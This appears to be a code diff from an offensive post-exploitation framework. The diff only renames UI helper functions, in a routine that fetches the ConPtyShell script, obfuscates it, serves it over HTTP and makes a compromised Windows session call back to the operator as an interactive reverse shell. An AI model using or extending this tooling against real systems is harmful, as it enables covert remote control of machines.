@@ -11,7 +11,7 @@ from koi.session import Session
 from koi.utils.cache import put_cache, get_cache, cache_path
 from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
 from koi.utils.tcp import spawn_http_server
-from koi.utils.ui import Spinner, notify, _b, _p
+from koi.utils.ui import Spinner, notify, bold, accent
 
 _CONPTYSHELL_URL = (
     "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
@@ -82,12 +82,12 @@ def upgrade_windows_conptyshell(
 
     ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
     http_port, _ = spawn_http_server(ps1_data, timeout=60.0)
-    notify('info', f"Serving ConPtyShell on port {_b(http_port)}")
+    notify('info', f"Serving ConPtyShell on port {bold(http_port)}")
 
     invoke_cmd = _build_invoke_cmd(local_ip, http_port, port, rows, cols, conpty_fn)
 
     notify('info',
-        f"Invoking ConPtyShell on session {_p(f'#{sess.id}')}, callback {_b(mask_ip(local_ip, 'local'))}:{_b(port)}"
+        f"Invoking ConPtyShell on session {accent(f'#{sess.id}')}, callback {bold(mask_ip(local_ip, 'local'))}:{bold(port)}"
     )
 
     if logger:
@@ -121,7 +121,7 @@ def upgrade_windows_conptyshell(
         new_sess.attach_logger(logger)
     time.sleep(0.3)
     new_sess.conn.sendall(b"\r\n")
-    notify('success', f"Session {_p(f'#{old_id}')} upgraded to ConPtyShell.")
+    notify('success', f"Session {accent(f'#{old_id}')} upgraded to ConPtyShell.")
 
 
 def _wait_for_new_session(
